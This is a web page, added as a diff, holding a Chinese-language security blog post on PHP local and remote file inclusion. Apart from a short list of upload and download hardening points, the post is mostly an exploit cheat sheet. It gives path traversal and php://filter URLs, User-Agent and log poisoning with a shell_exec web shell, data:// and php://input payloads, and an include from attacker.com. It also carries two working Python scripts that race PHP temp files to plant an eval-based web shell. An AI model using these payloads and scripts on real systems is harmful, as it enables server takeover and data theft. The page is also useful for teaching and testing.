@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="网络安全,黑客,JAVA安全,代码审计,渗透测试,入侵,SRC,扫描,WEB安全,移动安全,PHP">
+    <meta name="description" content="蓝骨, langu.xyz">
+    <meta name="author" content="langu_xyz">
+    
+        <title>
+            
+                Local File Inclusion and Remote File Inclusion |
+                    
+                        langu_xyz
+        </title>
+        
+<link rel="stylesheet" href="/css/style.css">
+
+            <link rel="shortcut icon" href="/images/logo.jpeg">
+                
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+                    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"blog.langu.xyz","root":"/","language":"zh","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/logo.jpeg","favicon":"/images/logo.jpeg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/shamo.jpg","description":"XYZ(无限未来)"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+
+                    <script>
+                        var _hmt = _hmt || [];
+                        (function() {
+                          var hm = document.createElement("script");
+                          hm.src = "https://hm.baidu.com/hm.js?1cd6e64ff252acf24b707985fcec8850";
+                          var s = document.getElementsByTagName("script")[0]; 
+                          s.parentNode.insertBefore(hm, s);
+                        })();
+                        </script>
+                        
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="langu_xyz" type="application/atom+xml">
+</head>
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                    <a class="logo-title" href="/">
+                        langu_xyz
+                    </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class="" href="/" >
+                                HOME
+                            </a>
+                        </li>
+                        
+                        <li class="menu-item">
+                            <a class="" href="/tags/THINK/" >
+                                THINK
+                            </a>
+                        </li>
+                        
+                            
+                                <li class="menu-item search search-popup-trigger">
+                                    <i class="fas fa-search"></i>
+                                </li>
+                                
+                                
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                    
+                        <div class="icon-item menu-bar">
+                            <div class="menu-bar-middle"></div>
+                        </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/" >
+                        HOME
+                    </a>
+                </li>
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/tags/THINK/" >
+                        THINK
+                    </a>
+                </li>
+                
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">Local File Inclusion and Remote File Inclusion</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/logo.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">langu_xyz</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2016-11-12 21:00:00
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/">安全技术</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Web/">Web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.9k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>8 Mins</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h3 id="Local-File-Inclusion"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion"></a>Local File Inclusion</h3><h3 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h3><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><ul>
+<li>大小</li>
+<li>类型</li>
+<li>存储位置</li>
+<li>内容安全</li>
+<li>访问权限</li>
+<li>名称随机化</li>
+</ul>
+<h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><ul>
+<li>下载路径</li>
+<li>敏感信息</li>
+<li>访问权限</li>
+</ul>
+<p>阿里云OSS安全 <a class="link" target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/126537.html?spm=a2c4g.11186623.6.552.44f874b8BaaI5y">https://help.aliyun.com/document_detail/126537.html?spm=a2c4g.11186623.6.552.44f874b8BaaI5y<i class="fas fa-external-link-alt"></i></a></p>
+<h4 id="1-Direct-Local-Include"><a href="#1-Direct-Local-Include" class="headerlink" title="1) Direct Local Include"></a>1) Direct Local Include</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://site.com/lfi.php?page=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2-php-filter"><a href="#2-php-filter" class="headerlink" title="2) php://filter"></a>2) php://filter</h4><p>php://filter是一种元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。简单来讲就是可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启allow_url_include；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/lfi.php?page=php://filter/resource=config.php</span><br><span class="line"></span><br><span class="line">http://www.site.com/lfi.php?page=php://filter/convert.base64-encode/resource=config.php</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-proc-self-environ"><a href="#3-proc-self-environ" class="headerlink" title="3) /proc/self/environ"></a>3) /proc/self/environ</h4><p>Request’s user agent can be found there</p>
+<p>用户可通过修改浏览器的agent信息插入自己的内容到该文件，将php代码写进去之后再利用LFI进行包含就可以实现漏洞的利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /lfi.php?page=/proc/self/environ&amp;cmd=id HTTP/1.1</span><br><span class="line">Host: www.site.com</span><br><span class="line">User-Agent: &lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-Including-images"><a href="#4-Including-images" class="headerlink" title="4) Including images"></a>4) Including images</h4><p>If image.jpg contains php code it will be interpreted.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/lfi.php?page=upload/image.jpg</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-Zip-and-Phar-wrappers"><a href="#5-Zip-and-Phar-wrappers" class="headerlink" title="5) Zip and Phar wrappers"></a>5) Zip and Phar wrappers</h4><p>File must be zip archive with any extension</p>
+<p>phar://伪协议 &gt;&gt; 数据流包装器，自 PHP 5.3.0 起开始有效，正好契合上面两个伪协议的利用条件。说通俗点就是php解压缩包的一个函数，解压的压缩包与后缀无关。</p>
+<p>用法：?file=phar://压缩包/内部文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/lfi.php?page=zip://image.zip#shell.php</span><br><span class="line"></span><br><span class="line">http://www.site.com/lfi.php?page=phar://image.phar#shell.php</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-File-Upload"><a href="#6-File-Upload" class="headerlink" title="6) File Upload"></a>6) File Upload</h4><p>It requires php interpreter that crashes upon infinite recursive inclusion, thus not removing temporary file.</p>
+<ol>
+<li>Upload a file and trigger a self-inclusion</li>
+<li>Repeat step 1 until successful attack</li>
+<li>Bruteforce inclusion of /tmp/php[0-9a-zA-Z]{6}</li>
+<li>Shell</li>
+</ol>
+<p>We have 62**6 possible values -&gt; 56800235584 filenames for temporary uploaded files<br>Birthday paradox can be applied and it results with about 280000 requests to find valid file with more than 50% chance.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] Trying to win the race&#x27;</span>)</span><br><span class="line">f = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4096</span> * <span class="number">4096</span>):</span><br><span class="line">    requests.post(<span class="string">&#x27;http://target.com/index.php?c=index.php&#x27;</span>, f)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] Bruteforcing the inclusion&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> fname <span class="keyword">in</span> itertools.combinations(string.ascii_letters + string.digits, <span class="number">6</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://target.com/index.php?c=/tmp/php&#x27;</span> + fname</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;load average&#x27;</span> <span class="keyword">in</span> r.text:  <span class="comment"># &lt;?php echo system(&#x27;uptime&#x27;);</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] We have got a shell: &#x27;</span> + url)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[x] Something went wrong, please try again&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>It is possible to send 20 files in one request that will be accepted by the server.</p>
+<h4 id="7-Session-Files"><a href="#7-Session-Files" class="headerlink" title="7) Session Files"></a>7) Session Files</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Session文件一般存放在/tmp/、/var/lib/php/session/、/var/lib/php/session/等目录下，文件名字一般以sess_SESSIONID来保存。</span><br><span class="line">首先，查看找到session文件并包含一次：文件名可以通过firefox的fire cookie插件查看当前session值。</span><br><span class="line">实际应用过程中需要注意以下几点：</span><br><span class="line">1)    网站可能没有生成临时session，以cookie方式保存用户信息，或者根本就完全没有。</span><br><span class="line">2)    Session文件内容的控制，这个时候我们就需要先通过包含查看当前session的内容，看session值中有没有我们可控的某个变量，比如url中的变量值。或者当前用户名username。如果有的话，我们就可以通过修改可控变量值控制恶意代码写入session文件。如果没有的话，可以考虑让服务器报错，有时候服务器会把报错信息写入用户的session文件的。我们控制使服务器报错的语句即可将恶意代码写入session。</span><br></pre></td></tr></table></figure>
+
+<h4 id="8-PHPInfo-Script"><a href="#8-PHPInfo-Script" class="headerlink" title="8) PHPInfo Script"></a>8) PHPInfo Script</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt; </span><br></pre></td></tr></table></figure>
+
+<h4 id="9-结合phpinfo包含临时文件"><a href="#9-结合phpinfo包含临时文件" class="headerlink" title="9) 结合phpinfo包含临时文件"></a>9) 结合phpinfo包含临时文件</h4><p>php有个特性是我们向服务器上任意php文件post请求上传数据时，都会生成临时文件，默认是传到tmp目录下，并且文件名是随机的。当然，我们可以暴力猜解，但是这样子还是太过鸡肋的。国外一个安全研究者提出利用phpinfo来找出所上传的文件路径，因为phpinfo会记录一些请求，包括在服务器上生成的临时文件名字和目录。所以借助phpinfo()我们可以找出临时文件名并利用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding=utf-8</span><br><span class="line"># Author : idwar</span><br><span class="line"># http://secer.org</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">可能需要你改的几个地方：</span><br><span class="line">1、host</span><br><span class="line">2、port</span><br><span class="line">3、request中的phpinfo页面名字及路径</span><br><span class="line">4、hello_lfi() 函数中的url，即存在lfi的页面和参数</span><br><span class="line">5、如果不成功或报错，尝试增加padding长度到7000、8000试试</span><br><span class="line">6、某些开了magic_quotes_gpc或者其他东西不能%00的，自行想办法截断并在（4）的位置对应修改</span><br><span class="line"> Good Luck :)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">import urllib2</span><br><span class="line">import hashlib</span><br><span class="line">from socket import *</span><br><span class="line">from time import sleep</span><br><span class="line">host = &#x27;192.168.92.132&#x27;</span><br><span class="line">#host = gethostbyname(domain)</span><br><span class="line">port = 80</span><br><span class="line">shell_name = hashlib.md5(host).hexdigest() + &#x27;.php&#x27;</span><br><span class="line">pattern = re.compile(r&#x27;&#x27;&#x27;\[tmp_name\]\s=&amp;gt;\s(.*)\W*error]&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">payload = &#x27;&#x27;&#x27;idwar&lt;?php fputs(fopen(&#x27;./&#x27;&#x27;&#x27; + shell_name + &#x27;&#x27;&#x27;\&#x27;,&quot;w&quot;),&quot;idwar was here&lt;?php eval(\$_POST[a]);?&gt;&quot;)?&gt;\r&#x27;&#x27;&#x27;</span><br><span class="line">req = &#x27;&#x27;&#x27;-----------------------------7dbff1ded0714\r</span><br><span class="line">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span><br><span class="line">Content-Type: text/plain\r</span><br><span class="line">\r</span><br><span class="line">%s</span><br><span class="line">-----------------------------7dbff1ded0714--\r&#x27;&#x27;&#x27; % payload</span><br><span class="line"></span><br><span class="line">padding=&#x27;A&#x27; * 8000</span><br><span class="line">request=&#x27;&#x27;&#x27;POST /test/1.php?a=&#x27;&#x27;&#x27;+padding+&#x27;&#x27;&#x27; HTTP/1.0\r</span><br><span class="line">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&#x27;&#x27;&#x27;+padding+&#x27;&#x27;&#x27;\r</span><br><span class="line">HTTP_ACCEPT: &#x27;&#x27;&#x27; + padding + &#x27;&#x27;&#x27;\r</span><br><span class="line">HTTP_USER_AGENT: &#x27;&#x27;&#x27; + padding + &#x27;&#x27;&#x27;\r</span><br><span class="line">HTTP_ACCEPT_LANGUAGE: &#x27;&#x27;&#x27; + padding + &#x27;&#x27;&#x27;\r</span><br><span class="line">HTTP_PRAGMA: &#x27;&#x27;&#x27; + padding + &#x27;&#x27;&#x27;\r</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span><br><span class="line">Content-Length: %s\r</span><br><span class="line">Host: %s\r</span><br><span class="line">\r</span><br><span class="line">%s&#x27;&#x27;&#x27; % (len(req), host, req)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def hello_lfi():</span><br><span class="line">    while 1:</span><br><span class="line">        s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">        s.connect((host, port))</span><br><span class="line">        s.send(request)</span><br><span class="line">        data = &#x27;&#x27;</span><br><span class="line">        while r&#x27;&lt;/body&gt;&lt;/html&gt;&#x27; not in data:</span><br><span class="line">            data = s.recv(9999)</span><br><span class="line">            search_ = re.search(pattern, data)</span><br><span class="line">            if search_:</span><br><span class="line">                tmp_file_name = search_.group(1)</span><br><span class="line">                url = r&#x27;http://192.168.92.132/test/2.php?s=%s%%00&#x27; % tmp_file_name</span><br><span class="line">                print url</span><br><span class="line">                search_request = urllib2.Request(url)</span><br><span class="line">                search_response = urllib2.urlopen(search_request)</span><br><span class="line">                html_data = search_response.read()</span><br><span class="line">                if &#x27;idwar&#x27; in html_data:</span><br><span class="line">                    s.close()</span><br><span class="line">                    return &#x27;\nDone. Your webshell is : \n\n%s\n&#x27; % (&#x27;http://&#x27; + host + &#x27;/&#x27; + shell_name)</span><br><span class="line">                    #import sys;sys.exit()</span><br><span class="line">        s.close()</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print hello_lfi()</span><br><span class="line">    print &#x27;\n Good Luck :)&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="10-Logs"><a href="#10-Logs" class="headerlink" title="10) Logs"></a>10) Logs</h4><p><code>包含web server日志文件</code></p>
+<p>不管我们提交的Get请求或者Post请求都会被apache记录到日志文件里。所以我们可以控制请求内容，将恶意代码写入日志文件，从而实现包含。</p>
+<p>直接访问<code>test.php?file=../&lt;?php phpinfo();?&gt;.php</code>，将会被记录下来。这样便成功将php代码写进log文件。</p>
+<p><code>FTP日志文件内容</code></p>
+<p>用户名填：<code>&lt;?php phpinfo();?&gt;</code></p>
+<h3 id="Remote-File-Inclusion"><a href="#Remote-File-Inclusion" class="headerlink" title="Remote File Inclusion"></a>Remote File Inclusion</h3><p>Works when allow_url_include in php.ini is set to TRUE</p>
+<h4 id="1-Direct-Remote-Include"><a href="#1-Direct-Remote-Include" class="headerlink" title="1) Direct Remote Include"></a>1) Direct Remote Include</h4><p>Including php file in text format directly</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/lfi.hpp?page=http://attacker.com/shell.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-Data-text-plain"><a href="#2-Data-text-plain" class="headerlink" title="2) Data:text/plain"></a>2) Data:text/plain</h4><p>Including php code through data stream</p>
+<p>data://伪协议 &gt;&gt; 数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/lfi.php?page=data:text/plain;,&lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">http://www.site.com/lfi.php?page=data:text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7Pz4=</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-php-input"><a href="#3-php-input" class="headerlink" title="3) php://input"></a>3) php://input</h4><p>?file=php://input 数据利用POST传过去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /lfi.php?page=php://input&amp;cmd=cd HTTP/1.1</span><br><span class="line">Host: www.site.com</span><br><span class="line">Content-Lenth: 39</span><br><span class="line"></span><br><span class="line">&lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Fighting-with-extensions"><a href="#Fighting-with-extensions" class="headerlink" title="Fighting with extensions"></a>Fighting with extensions</h3><h4 id="1-Null-Bytes"><a href="#1-Null-Bytes" class="headerlink" title="1) Null Bytes"></a>1) Null Bytes</h4><p>Add null byte that will terminate string</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/lfi.php?page=/etc/passwd%00</span><br><span class="line"></span><br><span class="line">http://www.site.com/lfi.php?page=/etc/passwd%2500</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-Truncation"><a href="#2-Truncation" class="headerlink" title="2) Truncation"></a>2) Truncation</h4><p>Cut extension by creating long string</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/lfi.php?page=../../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/lfi.php?page=/etc/passwd..............................</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.site.com/lfi.php?page=/etc/passwd.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>参考：</p>
+<p><a class="link" target="_blank" rel="noopener" href="http://www.2cto.com/article/201301/184439.html">利用本地包含漏洞执行任意代码<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/lucyoa/ctf-wiki/blob/master/web/file-inclusion/README.md">CTF-WIKI<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/L4oZu1/LFIboomCTF">LFIboomCTF<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：Local File Inclusion and Remote File Inclusion</li>
+        <li>Post author：langu_xyz</li>
+        <li>Create time：2016-11-12 21:00:00</li>
+        <li>
+            Post link：https://blog.langu.xyz/Local File Inclusion and Remote File Inclusion/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/PHPMailer%20%3C%205.2.18%20Remote%20Code%20Execution(CVE-2016-10033)/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">PHPMailer &lt; 5.2.18 Remote Code Execution(CVE-2016-10033)</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/Cross-site%20request%20forgery/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Cross-site request forgery</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>&nbsp;-&nbsp;
+            
+            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a target="_blank" rel="noopener" href="//langu.xyz">AboutME:langu_xyz</a>
+        </div>
+        <!--
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        -->
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
